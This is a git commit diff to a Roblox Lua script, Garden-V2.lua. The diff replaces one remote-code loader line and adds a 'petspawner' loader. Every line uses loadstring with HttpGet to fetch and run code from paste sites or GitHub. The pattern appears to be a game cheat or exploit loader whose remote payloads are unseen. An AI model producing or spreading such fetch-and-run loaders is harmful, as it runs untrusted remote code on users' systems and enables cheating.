6f50a8d1e13b39c0811f74a32f74c6f2608af6ae
No-lagHub <sumedangfy@gmail.com>
2025-06-02 10:30:41 +0700

    Update Garden-V2.lua

--- Garden-V2.lua
+++ Garden-V2.lua
@@ -1,2 +1,3 @@
-loadstring(game:HttpGet("https://pastefy.app/cd05CDas/raw"))()
+loadstring(game:HttpGet("https://paste.ee/r/etdPhIe0"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual",true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/No-lagHub/Garden/refs/heads/main/Garden-V2.lua"))()
